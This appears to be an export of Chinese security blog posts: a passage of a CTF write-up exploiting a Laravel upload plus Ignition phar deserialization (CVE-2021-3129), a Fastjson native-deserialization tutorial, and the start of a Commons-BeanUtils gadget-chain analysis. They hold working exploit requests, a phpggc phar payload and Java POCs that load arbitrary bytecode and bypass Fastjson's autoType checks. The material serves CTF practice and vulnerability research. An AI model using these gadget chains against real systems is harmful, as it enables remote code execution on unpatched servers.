200000\n```\n\n![image-20250714131607194](../image/achieve/202411/L3HCTF/image-20250714131607194.png)\n\n```\nL3HCTF{g4t3way_st1ll_n0t_s3cur3}\n```\n\n## gogogo出发喽（复现）\n\nLaravel框架的代码审计\n\n本来搜了一下CVE，看到一个RCE\n\nhttps://www.freebuf.com/vuls/264662.html\n\n![image-20250714162928371](../image/achieve/202411/L3HCTF/image-20250714162928371.png)\n\n开启了Debug模式，看看能不能打那个RCE\n\n先看看vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php\n\n在Http/Api/FileController类下找到一个image_base64的方法\n\n```php\n<?php\n/**\n * Author：春风\n * WeChat：binzhou5\n * Date：2020/10/24 14:25\n */\n\nnamespace App\\Http\\Controllers\\Api;\n\nuse App\\Http\\Controllers\\Controller;\nuse Illuminate\\Support\\Str;\n\nclass FileController extends Controller\n{\n    public function __construct()\n    {\n        // $this->middleware('jwt.auth');\n    }\n\n    /**\n     * Base64 图片上传\n     * @return \\Illuminate\\Http\\JsonResponse\n     */\n    public function image_base64()\n    {\n        $data = request()->post('data');\n        if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $data, $result)) {\n            $type = $result[2];\n            if (in_array($type, array('pjpeg', 'jpeg', 'jpg', 'gif', 'bmp', 'png'))) {\n                $url_path = 'images/'.auth('api')->id().'_'.Str::random().'.'.$type;\n                $file_path = public_path('uploads') .'/'. $url_path;\n                if (file_put_contents($file_path, base64_decode(str_replace($result[1], '', $data)))) {\n                    return response()->json([\n                        'code' => 200,\n                        'data' => [\n                            'url' =>  $url_path\n                        ]\n                    ]);\n                } else {\n                    return response()->json([\n                        'code' => 500,\n                        'message' => '上传失败'\n                    ]);\n                }\n            } else {\n                return response()->json([\n                    'code' => 500,\n                    'message' => '图片上传类型错误'\n                ]);\n            }\n        } else {\n            return response()->json([\n                'code' => 500,\n                'message' => '类型错误'\n            ]);\n        }\n    }\n}\n\n```\n\n可以上传文件，试着上传一个php文件看看\n\n```html\nPOST /api/image/base64 HTTP/1.1\nHost: 1.95.34.119:41164\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nContent-Type: application/json\n\n{\"data\":\"data:image/jpeg;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==\"}\n```\n\n![image-20250714170817165](../image/achieve/202411/L3HCTF/image-20250714170817165.png)\n\n![image-20250714170843338](../image/achieve/202411/L3HCTF/image-20250714170843338.png)\n\n上传成功，然后就是如何触发的问题\n\n后面在源码中发现了有Ignition 组件源码，我们看一下CVE-2021-3129能不能打\n\n利用phpggc生成恶意payload\n\n```php\nphp -d \"phar.readonly=0\" ./phpggc Laravel/RCE5 \"phpinfo();\" --phar phar -o /tmp/phar.gif\nphp -d'phar.readonly=0' ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o /tmp/test.gif\ncat /tmp/test.gif | base64 -w 0\n```\n\n上传发包\n\n```http\nPOST /api/image/base64 HTTP/1.1\nHost: 1.95.34.119:41164\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nContent-Type: application/json\n\n{\"data\":\"data:image/gif;base64,PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQr+AQAAAQAAABEAAAABAAAAAADIAQAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO2E6Mjp7aTowO086MjU6Ik1vY2tlcnlcTG9hZGVyXEV2YWxMb2FkZXIiOjA6e31pOjE7czo0OiJsb2FkIjt9fXM6ODoiACoAZXZlbnQiO086Mzg6IklsbHVtaW5hdGVcQnJvYWRjYXN0aW5nXEJyb2FkY2FzdEV2ZW50IjoxOntzOjEwOiJjb25uZWN0aW9uIjtPOjMyOiJNb2NrZXJ5XEdlbmVyYXRvclxNb2NrRGVmaW5pdGlvbiI6Mjp7czo5OiIAKgBjb25maWciO086MzU6Ik1vY2tlcnlcR2VuZXJhdG9yXE1vY2tDb25maWd1cmF0aW9uIjoxOntzOjc6IgAqAG5hbWUiO3M6NzoiYWJjZGVmZyI7fXM6NzoiACoAY29kZSI7czoyNToiPD9waHAgcGhwaW5mbygpOyBleGl0OyA/PiI7fX19CAAAAHRlc3QudHh0BAAAAIDKdGgEAAAADH5/2KQBAAAAAAAAdGVzdBsJxZ16KLI9YqcXd38DucW0USnSAgAAAEdCTUI=\"}\n```\n\n![image-20250714171837587](../image/achieve/202411/L3HCTF/image-20250714171837587.png)\n\n然后触发phar反序列化\n\n```http\nPOST /_ignition/execute-solution HTTP/1.1\nHost: 1.95.34.119:41164\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\n\n{\n\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\n\"parameters\":{\n\"viewFile\":\"phar:///var/www/html/public/uploads/images/_ywA9GzTeBuT3qSZs.gif/test.txt\",\n\"variableName\":\"test\"\n}\n}\n```\n\n不知道为啥一直500没打通，好奇怪\n\n","tags":["LitCTF2025"],"categories":["赛题wp"]},{"title":"Fastjson原生反序列化","url":"/2025/07/07/Java反序列化之Fastjson原生反序列化/","content":"\n## 前言\n\n之前打DASCTF2025上半年赛的时候infer师傅就出了一道java反序列化的题，其中就涉及到一个fastjson反序列化的问题，但是由于自己之前只学了CC链这些，所以赛后复现也比较困难，今天就紧赶慢赶把这个fastjson原生反序列化给学了\n\n参考文章：\n\nhttps://infernity.top/2025/02/16/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\n\nhttps://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\n\nhttps://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/\n\n## 关于Fastjson\n\nFastjson 作为一个高性能的 Java JSON 库，其核心功能是将 **Java 对象转换为 JSON 字符串**（即`toJSONString`）和将 **JSON 字符串转换为 Java 对象**（即`parseObject`/`parseArray`）。\n\n## Fastjson序列化核心流程\n\n### 1.属性发现规则\n\nFastjson 会按照以下优先级和规则来发现并获取对象的属性值，以便将其序列化为 JSON 字段：\n\n- **Getter 方法（高优先级）**：这是 Fastjson 发现属性的**主要方式**。它会查找类中所有公共（`public`）的、符合 JavaBean 规范的 Getter 方法。\n- **公共字段（Field）**：如果一个类中存在公共（`public`）的字段，Fastjson 也会直接读取这些字段的值。\n- **注解**：Fastjson 提供了一系列注解，允许开发者更精细地控制序列化行为。\n  - `@JSONField`：可以用于字段或 Getter 方法上，控制属性的名称、顺序、是否序列化、格式化等。例如，`@JSONField(name=\"userName\")` 可以将 `name` 字段序列化为 JSON 中的 `userName`。\n  - `@JSONType`：可以用于类上，控制整个类的序列化行为，例如指定序列化的字段、禁用某些字段等。\n\n### 2. 数据类型转换\n\nFastjson 能够智能地处理各种 Java 数据类型到 JSON 类型的映射：\n\n- **基本类型及其包装类**：`int`, `long`, `boolean`, `double`, `String` 等会直接转换为 JSON 的基本类型（数字、布尔、字符串）。\n- **复杂对象**：对象内部的引用类型字段会递归地进行序列化，形成嵌套的 JSON 对象。\n- **集合类型**：`List`, `Set`, `Map` 等集合类型会转换为 JSON 数组或 JSON 对象。\n- **日期类型**：默认情况下，`java.util.Date` 和 `java.sql.Timestamp` 等日期类型会转换为时间戳（`long` 类型），或者通过 `@JSONField(format=\"...\")` 指定为特定格式的字符串。\n- **枚举类型**：枚举的 `name()` 方法或 `toString()` 方法通常会被序列化为字符串。\n\n## 利用与版本限制\n\n市面上主要分fastjson1和fastjson2两种类别\n\nFastJson1版本\t<=\t1.2.48\n\nFastJson2版本\t>=\t1.2.49(目前高版本依旧通杀)\n\n## 环境搭建\n\n直接在maven文件里添加\n\n```xml\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>fastjson</artifactId>\n  <version>1.2.48</version>\n</dependency>\n```\n\n然后同步项目下载源码就可以了\n\n## FastJson1链子寻找\n\n既然是原生反序列化，那必然是在fastjson包里面的，我们直接去fastjson包中找哪些类实现了Serializable接口就行，最终只找到两个类，JSONArray与JSONObject，并且这两个类都是extends继承了JSON类的，我们拿第一个讲一下，实际上这两个在原生反序列化当中利用方式是相同的。\n\n![image-20250707102126725](../image/achieve/202411/java学习/image-20250707102126725.png)\n\n我们先来看JSONArray类，一整个看下来发现这个类虽然接入了Serializable接口，但是始终没有实现readObject方法的重载，并且在继承的父类JSON中也没有发现有readObject方法，这意味着我们需要从其他类中readObject方法作为入口方法去触发原生反序列化\n\n![image-20250707103022236](../image/achieve/202411/java学习/image-20250707103022236.png)\n\n### 触发getter()方法\n\n#### JSON#toString()\n\n注意到在JSON类中的toString()方法能触发toJSONString()方法\n\n```java\n    @Override\n    public String toString() {\n        return toJSONString();\n    }\n\n    public String toJSONString() {\n        SerializeWriter out = new SerializeWriter();\n        try {\n            new JSONSerializer(out).write(this);\n            return out.toString();\n        } finally {\n            out.close();\n        }\n    }\n```\n\n这里的话重写了toString()方法，该方法返回toJSONString()方法调用的结果，我们重点来看toJSONString()方法，这个方法是用于将当前对象序列化成JSON字符串，**而这里能调用任意类的getter方法**，例如有些类的`getter`方法是可以造成一些漏洞的，最经典的就是通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用，详细的可以看我之前CB链的文章https://wanth3f1ag.top/2025/07/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CB%E9%93%BE/#0x05%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90\n\n上面简单的介绍过Fastjson序列化的流程，关于为什么能触发任意类的getter方法请看：\n\nhttps://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91getter%E6%96%B9%E6%B3%95\n\n那么我们现在需要找一个能触发toString()方法的地方\n\n### 触发toString()方法1\n\n#### BadAttributeValueExpException#readObject()\n\n触发toString方法我们也有现成的链，通过BadAttributeValueExpException触发即可\n\n在BadAttributeValueExpException中的readObject方法\n\n![image-20250707132418373](../image/achieve/202411/java学习/image-20250707132418373.png)\n\n这里的话会从对象中读取一个val属性的值，并赋值给valObj变量，那么如果我们能控制这个ois对象中val属性的值为某个类的对象，那么就可以调用该对象的toString()方法，这里的话是可控的，之前在CC5中就用过https://wanth3f1ag.top/2025/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC5%E9%93%BE/#BadAttributeValueExpException-readObject\n\n所以我们的链子就是\n\n#### FastJson1最终链子1\n\n```java\nBadAttributeValueExpException#readObject()\n    ->JSON#toString()\n    \t->TemplatesImpl#getOutputProperties()\n    \t\tCC3链：\n    \t\t\tTemplatesImpl#newTransformer()->\n    \t\t\t\tTemplatesImpl#getTransletInstance()->\n        \t\t\t\t\tTemplatesImpl#defineTransletClasses()->\n            \t\t\t\t\tTemplatesImpl#defineClass()->\n                \t\t\t\t\t恶意类字节码执行\n```\n\n#### FastJson1最终POC1\n\n那我们直接写POC\n\n```java\npackage SerializeChains.fastjsonSer;\n\nimport com.alibaba.fastjson.JSONArray;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FastJsonser01 {\n    public static void main(String[] args) throws Exception {\n\n        //CC3中TemplatesImpl的利用链加载恶意类字节码\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates,\"_name\",\"a\");\n        byte[] code = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\JavaSerialize\\\\target\\\\classes\\\\SerializeChains\\\\CCchains\\\\CC3\\\\POC.class\"));\n        byte[][] codes = {code};\n        setFieldValue(templates,\"_bytecodes\",codes);\n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\n        //触发TemplatesImpl#getOutputProperties()方法\n        JSONArray jsonArray = new JSONArray();\n        jsonArray.add(templates);\n\n        //触发toString()方法\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        setFieldValue(badAttributeValueExpException,\"val\",jsonArray);\n\n        //序列化和反序列化\n        serialize(badAttributeValueExpException);\n        unserialize(\"fastjsonSerialize01.txt\");\n\n\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws Exception {\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n    //定义序列化操作\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"fastjsonSerialize01.txt\"));\n        oos.writeObject(object);\n        oos.close();\n    }\n\n    //定义反序列化操作\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));\n        ois.readObject();\n    }\n}\n```\n\n![image-20250707160239461](../image/achieve/202411/java学习/image-20250707160239461.png)\n\n### 触发toString()方法2\n\n#### HashMap#readObject()\n\n![image-20250715151459809](../image/achieve/202411/java学习/image-20250715151459809.png)\n\n在HashMap#readObject()方法中有一个putval方法，跟进putVal，这里调用equals方法\n\n![image-20250715151619820](../image/achieve/202411/java学习/image-20250715151619820.png)\n\n这里的话链子是调用到AbstractMap.equals，在equals中又调用到了XString的equals\n\n![image-20250715151838313](../image/achieve/202411/java学习/image-20250715151838313.png)\n\n#### XString#equals()\n\n继续跟进到XString的equals，可以看到可以调用任意类的toString，这里的obj2可以设置为JSONArray\n\n![image-20250715152038324](../image/achieve/202411/java学习/image-20250715152038324.png)\n\n所以最后的触发链子就是\n\n```java\nHashMap#readObject() -> XString#equals() -> 任意调#toString() \n```\n\nPOC的话暂时还没写出来，后面写了再补\n\n## FastJson2链子寻找\n\nFastJson2的版本是从1.2.49开始的，我们改一下maven项目的pom文件\n\n```xml\n    <dependency>\n      <groupId>com.alibaba</groupId>\n      <artifactId>fastjson</artifactId>\n      <version>1.2.49</version>\n    </dependency>\n```\n\n我们看看用之前的POC打的话会出现什么结果\n\n![image-20250707161950195](../image/achieve/202411/java学习/image-20250707161950195.png)\n\n`autoType is not support`这里指明出Fastjson的outoType功能被禁用了，这导致了无法反序列化，这是为什么呢？我们继续往下看\n\n从1.2.49开始，JSONArray以及JSONObject方法开始真正有了自己的readObject方法\n\n![image-20250707161657434](../image/achieve/202411/java学习/image-20250707161657434.png)\n\n由于反序列化的时候readObject的调用是从外到内的，所以内层的JSONArray或者JSONObject对象的readObject方法也会被调用\n\n首先看到一个`SecureObjectInputStream.ensureFields()`这个是一个强制获取私有字段并缓存的方法，通过获取输入流中的类的内部私有属性并缓存到fields数组中\n\n在`SecureObjectInputStream`类当中重写了resolveClass方法，其中调用了checkAutoType方法做类的检查，这样能实现对恶意类的拦截\n\n所以现在我们需要解决的问题是，什么情况下不会调用resolveClass，在`java.io.ObjectInputStream#readObject0`调用中，会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象\n\n```java\nswitch (tc) {\n                case TC_NULL:\n                    return readNull();\n                case TC_REFERENCE:\n                    return readHandle(unshared);\n                case TC_CLASS:\n                    return readClass(unshared);\n                case TC_CLASSDESC:\n                case TC_PROXYCLASSDESC:\n                    return readClassDesc(unshared);\n                case TC_STRING:\n                case TC_LONGSTRING:\n                    return checkResolve(readString(unshared));\n                case TC_ARRAY:\n                    return checkResolve(readArray(unshared));\n                case TC_ENUM:\n                    return checkResolve(readEnum(unshared));\n                case TC_OBJECT:\n                    return checkResolve(readOrdinaryObject(unshared));\n                case TC_EXCEPTION:\n                    IOException ex = readFatalException();\n                    throw new WriteAbortedException(\"writing aborted\", ex);\n                case TC_BLOCKDATA:\n                case TC_BLOCKDATALONG:\n                    if (oldMode) {\n                        bin.setBlockDataMode(true);\n                        bin.peek();             // force header read\n                        throw new OptionalDataException(\n                            bin.currentBlockRemaining());\n                    } else {\n                        throw new StreamCorruptedException(\n                            \"unexpected block data\");\n                    }\n                case TC_ENDBLOCKDATA:\n                    if (oldMode) {\n                        throw new OptionalDataException(true);\n                    } else {\n                        throw new StreamCorruptedException(\n                            \"unexpected end of block data\");\n                    }\n                default:\n                    throw new StreamCorruptedException(\n                        String.format(\"invalid type code: %02X\", tc));\n            }\n\n```\n\n上面的不同case中大部分类都会最终调用`readClassDesc`去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是`TC_CLASSDESC`那么就会在`readNonProxyDesc`中触发`resolveClass`\n\n那我们重点关注一下不会调用readClassDesc的分支，不会调用readClassDesc的分支有TC_NULL、TC_REFERENCE、TC_STRING、TC_LONGSTRING、TC_EXCEPTION，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关。那么就只剩下了reference引用类型了。\n\n### 如何成为引用类型\n\n或许在进行反序列化恢复对象的时候，让我们的恶意类变成引用类型能绕过resolveClass的检查？\n\n首先我们要知道，两个相同的对象在同一个反序列化的过程中只会被反序列化一次。那么我们可以在序列化的时候注入两个相同的 `TemplatesImpl` 对象，第二个 `TemplatesImpl` 对象被封装到 `JSONArray` 中。那么在反序列化我们的 `payload` 时，如果先用正常的 `ObjectInputStream` 反序列化了第一个 `TemplatesImpl` 对象，那么在第二次在 `JSONArray.readObject()` 中，就不会再用 `SecureObjectInputStream` 来反序列化这个相同的 `TemplatesImpl` 对象了，就会绕过`checkAutoType()`的检查！\n\n反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给`SecureObjectInputStream`，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过\n\n**所以用List、Map、Set类型都能成功触发引用绕过**\n\n### FastJson2-POC1(List类型)\n\n其实主要还是在如何避免反序列化的时候内部对象调用`JSONArray.readObject()`时会反序列化我们的templates对象\n\n```java\n        //用list去绕过fastjson2\n        ArrayList<Object> list = new ArrayList<Object>();\n        list.add(templates);\n        list.add(badAttributeValueExpException);\n\n        //序列化和反序列化\n        serialize(list);\n        unserialize(\"fastjsonSerialize02.txt\");\n```\n\n![image-20250715161945620](../image/achieve/202411/java学习/image-20250715161945620.png)\n\n当我们写入对象时，会在handles这个哈希表中建立从对象到引用的映射\n\n![image-20250715160824902](../image/achieve/202411/java学习/image-20250715160824902.png)\n\n当再次写入同一对象的时，会先在handles这个hash表中查到了映射，那么就会通过writeHandle将重复对象以引用类型写入\n\n因此我们就可以利用这个思路构建攻击的payload了。\n\n### FastJson2-POC2(Map类型)\n\n```java\n        //用Map去绕过fastjson2\n        HashMap map = new HashMap();\n        map.put(templates, badAttributeValueExpException);\n\n        //序列化和反序列化\n        serialize(map);\n        unserialize(\"fastjsonSerialize03.txt\");\n```\n\n![image-20250715162025020](../image/achieve/202411/java学习/image-20250715162025020.png)\n\n### FastJson2-POC3(Set类型)\n\n```java\n        //用Set去绕过fastjson2\n        Set set = new HashSet();\n        set.add(templates);\n        set.add(badAttributeValueExpException);\n\n        //序列化和反序列化\n        serialize(set);\n        unserialize(\"fastjsonSerialize04.txt\");\n```\n\n![image-20250715162237904](../image/achieve/202411/java学习/image-20250715162237904.png)\n\n**至此 fastjson 全版本实现了原生反序列化利用！**\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"Java反序列化CB链","url":"/2025/07/06/Java反序列化CB链/","content":"\n## 0x01前言\n\n前面分析完了CC链，中间间隔了一个多星期吧，摆了一个多星期，期末考加上考完试就飞北京，另外重新做了一遍ctfshow的命令执行，主要是感觉生疏了，反正这阵子忙忙碌碌的，刚好上一天班放了个周末，不过明天就要正式工作上班了\n\n参考文章：\n\nhttps://infernity.top/2024/04/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/\n\n## 0x02漏洞描述\n\nCB链是类似于我们前面分析的CC链的一种反序列化链子，是基于Apache Commons项目下Commons-beanutils库利用的一种反序列化漏洞的利用链。\n\n**Commons-Beanutils** 是 Apache Commons 项目下的一个常用 Java 库，它提供了一些实用的工具类来操作 Java Bean 的属性。\n\n## 0x03影响版本\n\njdk：jdk8u65\n\nCB：commons-beanutils 1.8.3\n\ncommons-logging:1.2\n\n在pom.xml中添加项目\n\n```xml\n<dependency>\n      <groupId>commons-beanutils</groupId>\n      <artifactId>commons-beanutils</artifactId>\n      <version>1.8.3</version>\n    </dependency>\n    <dependency>\n      <groupId>commons-logging</groupId>\n      <artifactId>commons-logging</artifactId>\n      <version>1.2</version>\n    </dependency>\n```\n\n## 0x04关于Javabean\n\nCommonsBeanutils 是应用于 javabean 的工具，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法\n\n那 什么是JavaBean呢？\n\n**JavaBean** 是一种特殊的 Java 类，它遵循一定的命名约定和设计模式，目的是为了组件的**可重用性、易用性**和在不同环境（如可视化开发工具、框架）中的**互操作性**。可以把 JavaBean 想象成一个标准化的、自包含的软件组件，它能够通过简单的方式被其他组件或工具使用和操作。\n\n一个 Java 类要被称为 JavaBean，通常需要满足以下约定：\n\n- 无参构造器\n\n该类必须有一个公共的、无参数的构造器，这样，外部工具（如反射、框架）就可以很容易地创建JavaBean实例而不需要知道如何传递特定参数\n\n- 有一个无参的公共的构造器\n- JavaBean类通常会包含一些私有属性，而每个属性都通过一对公共的 **Getter 方法** 和 **Setter 方法** 来访问和修改。\n- 对于boolean类型的成员变量，允许使用\"is\"代替上面的\"get\"和\"set\"\n\n我们写一个简单的JavaBean类\n\n```java\npackage CBchains;\n\npublic class JavaBeanTest {\n    private String name;\n    private int age;\n\n    public String getName(){\n        return name;\n    }\n\n    public void setName(String name){\n        this.name = name;\n    }\n\n    public int getAge(){\n        return age;\n    }\n\n    public void setAge(int age){\n        this.age = age;\n    }\n}\n```\n\n在commons-beanutils的java库中的PropertyUtils类能够动态调用getter/setter方法，获取属性值。\n\n- getProperty：返回指定Bean的指定属性的值\n- getSimpleProperty：返回指定Bean的指定属性的值\n- setProperty：设置指定Bean的指定属性的值\n- setSimpleProperty：设置指定Bean的指定属性的值\n\n我们可以试一下\n\n```java\npackage CBchains.POC;\nimport org.apache.commons.beanutils.PropertyUtils;\n\npublic class JavaBeanTest {\n    public static void main(String[] args) throws Exception{\n        JavaBeanTest test = new JavaBeanTest();\n        test.setAge(20);\n        test.setName(\"John\");\n\n        //利用PropertyUtils获取属性值\n        String name1 = (String) PropertyUtils.getProperty(test, \"name\");\n        System.out.println(name1);\n\n        int age1 = (int) PropertyUtils.getProperty(test, \"age\");\n        System.out.println(age1);\n\n        //利用PropertyUtils设置属性值\n        PropertyUtils.setProperty(test, \"name\",\"wanth3flag\");\n        System.out.println(test.getName());\n\n        PropertyUtils.setProperty(test, \"age\",21);\n        System.out.println(test.getAge());\n\n    }\n    private String name;\n    private int age;\n\n    public String getName(){\n        return name;\n    }\n\n    public void setName(String name){\n        this.name = name;\n    }\n\n    public int getAge(){\n        return age;\n    }\n\n    public void setAge(int age){\n        this.age = age;\n    }\n}\n/*\nJohn\n20\nwanth3flag\n21\n*/\n```\n\n这里的setProperty和getProperty实际上和JavaBean中getter和setter方法没什么区别\n\n## 0x05链子分析\n\ncommons-beanutils中提供了一个静态方法`PropertyUtils.getProperty()`，可以让使用者直接调用任意JavaBean的getter方法\n\n我们来看看该方法的定义\n\n```java\n    public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException {\n        return PropertyUtilsBean.getInstance().getProperty(bean, name);\n    }\n```\n\n这里的话接收两个参数，一个是JavaBean实例，一个是JavaBean的属性，具体的上面我们也试过了，很好理解这个点\n\n需要注意的是，`PropertyUtils.getProperty` 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。\n\n回顾一下之前的CC3，是通过利用TemplatesImpl类的方法去动态加载恶意类从而进行RCE的\n\n```java\nTemplatesImpl::newTransformer()->\n    TemplatesImpl::getTransletInstance()->\n        TemplatesImpl::defineTransletClasses()->\n            TemplatesImpl::defineClass()->\n                恶意类代码执行\n```\n\n然后我们再看看CC2/CC4的链子，其实就是CC1的另一种分支，是通过TransformingComparator#compare()去触发transform方法的调用从而实现RCE的\n\n```java\nPriorityQueue#readObject()\n    PriorityQueue#heapify()\n        PriorityQueue#siftDown()    \n            PriorityQueue#siftDownUsingComparator()\n                    TransformingComparator#compare()\n    \t\t\t\t\tChainedTransformer#transform()\n                        \tInstantiateTransformer#transform()\n                            \tTemplatesImpl#newTransformer()\n                                \tdefineClass()->newInstance()\n```\n\n而我们的Commons-beanutils利用链中的核心触发位置就是`BeanComparator.compare()` 函数，`BeanComparator.compare()` 函数内部会调用getProperty()方法，进而可以调用JavaBean中对应属性的getter方法\n\n### BeanComparator.compare()\n\n我们看一下`BeanComparator.compare()` 函数\n\n![image-20250706124221807](../image/achieve/202411/java学习/image-20250706124221807.png)\n\n这里会调用PropertyUtils#getProperty()方法\n\n我们分析一下这个函数的步骤\n\n- 这个方法接收两个对象传入，如果 `property` 变量是 `null`则直接比较这两个对象，这时候会直接用comparator实例的compare方法对这两个对象进行比较\n- 如果`this.property`不为空，则用`PropertyUtils.getProperty`分别取这两个对象的`this.property`属性，比较属性的值。\n\n在 ysoserial 中利用其来调用了 Temlatesimpl.getOutputProperties() 方法也就是Temlatesimpl类中的 `_outputProperties` 属性的 getter 方法\n\n所以这里让 o1 为templates对象，然后property为TemplatesImpl的 `_outputProperties` 属性，即可调用 `TemplatesImpl.getOutputProperties()`， 往下就是TemplatesImpl的利用链。\n\n我们来看一下BeanComparator的构造函数\n\n```java\n    public BeanComparator( String property ) {\n        this( property, ComparableComparator.getInstance() );\n    }\n```\n\n公共属性，那我们就可以处理这个property属性的值了，写个poc\n\n```java\nBeanComparator comparator = new BeanComparator(\"outputProperties\");\n```\n\n在ysoserial中是利用的无参构造器实例化一个BeanComparator对象并用反射去进行操作变量的\n\n```java\n    public static void main(String[] args) throws Exception {\n        BeanComparator comparator = new BeanComparator();\n        setFieldValue(comparator, \"property\", \"outputProperties\");\n    }\n    public static void setFieldValue(Object object, String field_name, Object field_value) throws Exception {\n        Class c = object.getClass();\n        Field field = c.getDeclaredField(field_name);\n        field.setAccessible(true);\n        field.set(object, field_value);\n    }\n```\n\n然后就会调用到`TemplatesImpl.getOutputProperties()`，这个方法可以调用`newTransformer()`\n\n那么我们接着往上找，哪里调用 compare()呢？\n\n我们可以用到CC2/CC4中的PriorityQueue#readObject()方法\n\n### PriorityQueue#readObject()\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        // Read in size, and any hidden stuff\n        s.defaultReadObject();\n\n        // Read in (and discard) array length\n        s.readInt();\n\n        queue = new Object[size];\n\n        // Read in all elements.\n        for (int i = 0; i < size; i++)\n            queue[i] = s.readObject();\n\n        // Elements are guaranteed to be in \"proper order\", but the\n        // spec has never explained what that might be.\n        heapify();\n    }\n```\n\nheapify()里面的size的值应该大于等于2，这个在之前CC4/CC2链的时候都讲过，然后在对size赋值的时候是有两种方法，一种是直接赋值一种是用自带的add方法去赋值，而add()也会执行compare由于在BeanComparator#compare() 中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对1、2进行排序。所以在初始化的时候，我们add任意值，然后利用反射修改成恶意TemplateImpl 对象\n\n![image-20250706133818604](../image/achieve/202411/java学习/image-20250706133818604.png)\n\n```java\n        BeanComparator comparator = new BeanComparator();\n        PriorityQueue queue = new PriorityQueue<Object>(2, comparator);\n        queue.add(1);\n        queue.add(2);\n        setFieldValue(comparator, \"property\", \"outputProperties\");\n```\n\n跟CC2/CC4不同的是，CC2/CC4是通过调用TransformingComparator#compare()调用transform方法的，而这里是通过BeanComparator#compare()去调用getter，因此还需要控制 BeanComparator.compare()的参数为恶意templates对象\n\n所以最终的CB链\n\n## 0x06最终CB链\n\n```java\nPriorityQueue类：\nPriorityQueue#readObject()\n    PriorityQueue#heapify()\n        PriorityQueue#siftDown()    \n            